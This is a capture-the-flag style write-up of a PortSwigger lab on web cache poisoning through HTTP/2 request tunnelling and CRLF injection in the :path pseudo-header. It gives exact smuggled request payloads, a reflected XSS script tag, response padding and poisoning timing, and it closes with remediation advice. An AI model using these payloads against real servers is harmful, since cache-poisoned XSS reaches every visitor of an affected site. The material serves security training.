# Lab 18: Web cache poisoning via HTTP/2 request tunnelling

**Category:** HTTP Request Smuggling
**Difficulty:** Expert
**Lab link:** [Web cache poisoning via HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling)

## Overview

Combines three Expert-tier techniques: HTTP/2 request tunnelling (Lab 17), CRLF injection in the `:path` pseudo-header (new), and cache poisoning (Lab 11). Front-end doesn't reuse back-end connections so classic smuggling is dead. The attack tunnels a `GET /resources?xss=<script>alert(1)</script>` through an injection in `:path`, pads the response to exceed the outer `/` response's `Content-Length`, and times the attack so the front-end caches the poisoned response under the real `/` key. Victim loads home page every ~15s → cached XSS fires → lab solved.

## Key Concepts

- **`:path` pseudo-header CRLF injection** — Labs 15/16/17 injected into header values and names; this lab targets the `:path` pseudo-header. Any HTTP/2 → HTTP/1 downgrade that writes `:path` verbatim into the HTTP/1 request line is vulnerable.
- **Tunnelling + cache poisoning** — tunnelled response bytes become the attacker's outer response body, which the front-end then caches under the outer path.
- **Response padding is make-or-break.** The tunnelled response must exceed the outer `Content-Length` the front-end expects, otherwise the response times out or errors.
- **Cachebuster first, real path second.** Confirm the chain works on `/?cachebuster=N` (unique cache key, doesn't affect production) before poisoning the real `/`.

## Burp Setup

- Repeater → Inspector → **HTTP/2**.
- Repeater menu → uncheck **Update Content-Length**.

## Direct Steps

### Step 1 — Confirm `:path` CRLF injection

Inspector → Request Attributes → click `:path`, set to:
```
/
Foo: bar
```
(two lines, Shift+Enter between)

Send. Normal 200 response confirms injection.

### Step 2 — Tunnel a `GET /post?postId=1`

Set `:method` to `HEAD`. `:path` to:
```
/ HTTP/1.1
Host: LAB-ID.web-security-academy.net

GET /post?postId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Foo: bar
```

Send. Response body contains the blog post HTML → tunnelling confirmed.

### Step 3 — Confirm cache poisoning with cachebuster

Change outer `:path` to use `/?cb=1`. Send. Then `GET /?cb=1` in another tab — response should be the blog post, not the home page. Cache poisoned.

### Step 4 — Find XSS gadget

`GET /resources?xss=<script>alert(1)</script>` reflects the query string unencoded in a redirect response.

### Step 5 — Tunnel the XSS gadget, pad to exceed outer response size

Check a normal `GET /` response's `Content-Length` in proxy history. Call it **N** (this lab: ~8869 bytes).

Set `:path` to:
```
/?cachebuster=3 HTTP/1.1
Host: LAB-ID.web-security-academy.net

GET /resources?xss=<script>alert(1)</script>AAAA...(~9000 A's)...AAAA HTTP/1.1
Host: LAB-ID.web-security-academy.net
Foo: bar
```

Padding must make the tunnelled response body > N. Generate with `python -c "print('A'*9000)"`.

Send. Response should return (not timeout) with the XSS reflection visible inside.

### Step 6 — Confirm XSS fires via cachebuster

Browser: `https://LAB-ID.web-security-academy.net/?cachebuster=3` → `alert(1)` fires.

### Step 7 — Poison the real `/`

Remove the cachebuster. `:path`:
```
/ HTTP/1.1
Host: LAB-ID.web-security-academy.net

GET /resources?xss=<script>alert(1)</script>AAAA...(9000 A's)...AAAA HTTP/1.1
Host: LAB-ID.web-security-academy.net
Foo: bar
```

Send every ~5 seconds. Catches the cache refresh window.

Victim loads `/` every ~15s → gets the cached poisoned response → `alert(1)` fires → lab solved.

## How `:path` Injection Works

HTTP/2 encodes `:path` as a pseudo-header. After downgrade, the front-end writes the HTTP/1 request line as:

```
<METHOD> <:path VALUE> HTTP/1.1
```

If `:path` contains CRLF and additional HTTP/1 request lines, the back-end sees multiple complete requests on one connection:

```
HEAD / HTTP/1.1
Host: LAB-ID...

GET /resources?xss=... HTTP/1.1
Host: LAB-ID...
Foo: bar
<other headers appended by front-end>
```

Tunnelling response bytes come back inside the attacker's outer response body — the front-end then caches that body under the outer path's cache key.

## Why Padding Is Make-or-Break

The outer response has a `Content-Length` set by the front-end based on what it expects for `GET /`. If the tunnelled response body is **shorter** than that, the front-end waits for more bytes (timeout) or errors with "not enough bytes." Padding the tunnelled response (via query-string reflection) until it exceeds the outer CL unblocks the response.

Observed in this lab: `GET /` response is 8869 bytes; needed ~9000 A's of padding.

## Why Cachebuster First

Hitting the real `/` cache key risks DOS'ing the whole lab for the duration of the attack. Using `/?cb=N` makes a separate cache entry you can test and iterate on without affecting the production path. Once the chain is confirmed, remove the cachebuster for the final poison of `/`.

## Why the ~5 Second Interval

`/`'s cache TTL is short (likely 30-60 seconds). The cache refreshes periodically; your poison has to land during a refresh window to become the stored entry. Spamming every 5 seconds maximizes the chance of catching one.

## Why It Worked

- Front-end accepts HTTP/2 `:path` values containing CRLF without validation.
- Front-end writes `:path` verbatim into the HTTP/1 request line after downgrade.
- Back-end's HTTP/1 parser sees two complete requests on one connection.
- Front-end's response bytes-reader includes the tunnelled response as part of the outer response body.
- Front-end caches the outer response (body includes tunnelled XSS payload) under the outer path.

## Remediation

- **Validate HTTP/2 pseudo-header values** (`:path`, `:method`, `:scheme`, `:authority`) at the front-end. Reject CRLF, NUL, control characters per RFC 9113 §8.1.1.
- **Don't cache responses whose body contains uncommon status markers** (redirects to unrelated hosts, atypical content types for the URL).
- **Use HTTP/2 end-to-end** to eliminate the downgrade step.
- **Short cache TTLs** reduce blast radius.
- **Response normalization** — refuse to pair a tunnelled response with the outer request if the back-end returns more bytes than the outer request should have produced.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/request-smuggling/lab-18-h2-web-cache-poisoning-tunnelling/solve.py)

Documentation-first — HPACK framing with CRLF in `:path` needs low-level HTTP/2 library control. Manual Burp Inspector + Shift+Enter is the clean path.

## Key Takeaways

- **`:path` pseudo-header injection** is a distinct bug class from header-name/value injection. Any HTTP/2 → HTTP/1 downgrade that writes `:path` into the request line is a target.
- **Tunnelling + caching = persistence.** The attacker's tunnelled response gets cached under the outer URL, affecting every visitor until the cache TTL expires.
- **Response padding is the hardest practical step.** Measure the normal response's Content-Length first; pad the tunnelled response to exceed it.
- **Cachebuster debugging pattern:** confirm the chain on `?cb=N` before touching the real cache key.
- **Fix at the HTTP/2 → HTTP/1 translator.** Every HTTP/2 field written verbatim into HTTP/1 syntax is a smuggling surface — pseudo-headers included.
